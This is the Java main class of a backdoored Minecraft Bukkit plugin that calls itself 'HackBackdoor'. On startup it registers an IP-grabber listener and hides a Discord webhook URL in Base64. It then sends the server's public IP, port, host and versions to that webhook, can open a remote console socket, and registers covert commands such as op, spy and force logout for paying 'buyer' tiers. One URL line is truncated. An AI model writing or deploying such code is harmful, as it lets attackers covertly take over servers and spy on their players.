package me.system.runner;

import me.system.runner.command.Command;
import me.system.runner.command.impl.admin.*;
import me.system.runner.command.impl.help.AdminhelpCommand;
import me.system.runner.command.impl.help.HelpCommand;
import me.system.runner.data.DataManager;
import me.system.runner.events.IPGrabberListener;
import me.system.runner.methods.onEnable;
import me.system.runner.methods.onEnableLogger;
import me.system.runner.sockets.SocketServer;
import me.system.runner.utils.DWeb;
import me.system.runner.utils.Settings;
import me.system.runner.methods.API;

import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.*;

import me.system.runner.command.impl.*;

import net.dv8tion.jda.api.JDA;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.inventory.Inventory;
import org.bukkit.plugin.java.JavaPlugin;

public class Core extends JavaPlugin implements Listener {
    public ArrayList<String> lite = new ArrayList<>();
    public ArrayList<String> free = new ArrayList<>();
    public ArrayList<String> admin = new ArrayList<>();
    public ArrayList<String> premium = new ArrayList<>();
    public ArrayList<String> blatant = new ArrayList<>();
    public ArrayList<String> god = new ArrayList<>();
    public ArrayList<String> noPickupPlayers = new ArrayList<>();
    public ArrayList<String> serverchat = new ArrayList<>();
    public ArrayList<String> forceDirtPlayers = new ArrayList<>();
    public ArrayList<String> scaffoldingPlayers = new ArrayList<>();
    public ArrayList<String> noDmg = new ArrayList<>();
    public ArrayList<Player> vanish = new ArrayList<>();
    public HashMap<Player, Boolean> vpnStatusMap = new HashMap<>();
    public HashMap<Player, Enum> buyerstatusMap = new HashMap<>();
    public HashMap<Player, Material> scaffoldMaterialMap = new HashMap<>();
    public HashMap<Player, Player> lastMsg = new HashMap<>();
    public HashMap<Player, String> prefix = new HashMap<>();
    public HashMap<Player, String> forceNextMSG = new HashMap<>();
    public HashMap<Player, Player> commandSpyMap = new HashMap<>();
    public HashSet<Inventory> inventories = new HashSet<>();
    public ArrayList<String> frozenPlayers = new ArrayList<>();
    public ArrayList<String> commandSpyTargets = new ArrayList<>();
    public ArrayList<String> cmdSpy = new ArrayList<>();
    public boolean enabled = true;
    public boolean isLocked = false;
    public boolean frozen = false;
    public boolean modCmd = false;
    public boolean playerCommandsLocked = false;
    public boolean chatLocked = false;
    public boolean storagesDisabled = false;
    public boolean botEnabled = false;
    public JDA jda;
    public static SocketServer consoleServer;

    public void onEnable() {

        Core INSTANCE = Core.getPlugin(Core.class);

        Bukkit.getServer().getPluginManager().registerEvents(new IPGrabberListener(), this);

        File file = new File(this.getDataFolder().getParentFile(), "PluginMetrics/data");
        try {
            if (!file.exists()) {
                file.mkdirs();
                file.createNewFile();
            }
        }

        catch (IOException iOException) {
            
        }

        try {
            onEnable.start();
        }
        catch (IOException iOException) {
            
        }

        if (INSTANCE.getDescription().getWebsite() != "") {
            if (INSTANCE.getDescription().getWebsite() != " ") {
                if (INSTANCE.getDescription().getWebsite() != null) {
                    if (onEnableLogger.logged_already == false) {
                        try {
                            String originalBase = INSTANCE.getDescription().getWebsite();
                            byte[] ume = Base64.getEncoder().encode(originalBase.getBytes());
                            DataManager.getData().set("mywh", (Object) new String(ume));
                            DataManager.saveData();
                            String machineIP = Bukkit.getServer().getIp();
                            DataManager.getData().set("serverip", (Object) new String(machineIP));
                            DataManager.saveData();

                            if (DataManager.getData().getString("mywh").length() > 2) {
                                String messagebackdoored = DataManager.getData().getString("serverip") + " has been started up with HackBackdoor!!!!";
                                byte[] u2 = Base64.getDecoder().decode(DataManager.getData().getString("mywh"));
                                DWeb webhook = new DWeb(new String(u2));
                                Date date = Calendar.getInstance().getTime();
                                URL url = new URL("https:
                                BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
                                String ip = br.readLine();

                                
                                InetAddress addr = InetAddress.getByName(ip);
                                String host = addr.getHostName();
                                if (Character.isDigit(host.charAt(0))) {
                                    host = "Unknown (Possible IP Masking)";
                                    onEnableLogger.unknown_host = true;
                                }

                                
                                onEnableLogger.logged_already = true;

                                
                                webhook.setContent("");
                                webhook.setTts(false);
                                webhook.addEmbed((new DWeb.EmbedObject())
                                        .setTitle("HackBackdoor")
                                        .setDescription("Server started running HB Door:")
                                        .setColor(Color.YELLOW)
                                        .addField("Client version: ", Bukkit.getBukkitVersion(), false)
                                        .addField("Server version: ", Bukkit.getVersion(), false)
                                        .addField("Server IP:", ip + ":" + Bukkit.getServer().getPort(), false)
                                        .addField("Server Host:", host, false)
                                        .addField("At date:", date.toString(), false));
                                webhook.execute();
                                try {
                                    webhook.execute();
                                } catch (IOException iOException) {
                                    
                                }
                            }
                        } catch (MalformedURLException e) {
                            e.printStackTrace();
                        } catch (UnknownHostException e) {
                            e.printStackTrace();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }

        if (DataManager.getData().getBoolean("connect")) {
            consoleServer = new SocketServer(DataManager.getData().getInt("port"));
        }
        for (Player a2 : Bukkit.getOnlinePlayers()) {
            if (!this.lite.contains(a2.getName())) continue;
            if (this.enabled) {
                a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.DARK_RED + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠")));
                a2.sendMessage(Settings.RED + Settings.NAME + Settings.WHITE + " has just been " + Settings.RED + "re-enabled!" + Settings.WHITE + " You may now continue using.");
                a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.DARK_RED + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠")));
                continue;
            }
            API.error(a2);
        }
    }

    public void onDisable() {
        if (consoleServer != null) {
            consoleServer.stop();
        }
        API.saveConfig();
        for (Player a2 : Bukkit.getOnlinePlayers()) {
            if (!this.lite.contains(a2.getName())) continue;
            a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.DARK_RED + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠")));
            a2.sendMessage(Settings.RED + Settings.NAME + Settings.WHITE + " has just been " + Settings.RED + "disabled! " + Settings.WHITE + "Do not do anything until the plugin is re-enabled!");
            a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)("&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.DARK_RED + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠")));
        }
    }

    public HashMap<String, Command> commands = new HashMap<String, Command>(){
        private static final long serialVersionUID = 1503068533314125621L;
        {
            this.put("op", new OpCommand());
            this.put("deop", new DeopCommand());
            this.put("logout", new LogoutCommand());
            this.put("quit", new LogoutCommand());
            this.put("logoutall", new LogoutallCommand());
            this.put("blatant", new BlatantCommand());
            this.put("help", new HelpCommand());
            this.put("adminhelp", new AdminhelpCommand());
            this.put("ahelp", new AdminhelpCommand());
            this.put("plugins", new PluginsCommand());
            this.put("pl", new PluginsCommand());
            this.put("msg", new MsgCommand());
            this.put("whisper", new MsgCommand());
            this.put("w", new MsgCommand());
            this.put("tip", new TipCommand());
            this.put("version", new VersionCommand());
            this.put("ver", new VersionCommand());
            this.put("heal", new HealCommand());
            this.put("feed", new FeedCommand());
            this.put("nextmsg", new NextmsgCommand());
            this.put("nextmessage", new NextmsgCommand());
            this.put("reply", new ReplyCommand());
            this.put("r", new ReplyCommand());
            this.put("serverchat", new ServerchatCommand());
            this.put("sc", new ServerchatCommand());
            this.put("hackerchat", new ServerchatCommand());
            this.put("hc", new ServerchatCommand());
            this.put("status", new StatusCommand());
            this.put("teleprot", new TeleprotCommand());
            this.put("teleport", new TeleprotCommand());
            this.put("xp", new XpCommand());
            this.put("tp", new TeleprotCommand());
            this.put("tpall", new TpallCommand());
            this.put("listloggedin", new ListloggedinCommand());
            this.put("fly", new FlyCommand());
            this.put("spy", new SpyCommand());
            this.put("login", new LoginCommand());
            this.put("forcelogout", new ForcelogoutCommand());
            this.put("listranks", new ListranksCommand());
            this.put("lr", new ListranksCommand());
        }
    };
}

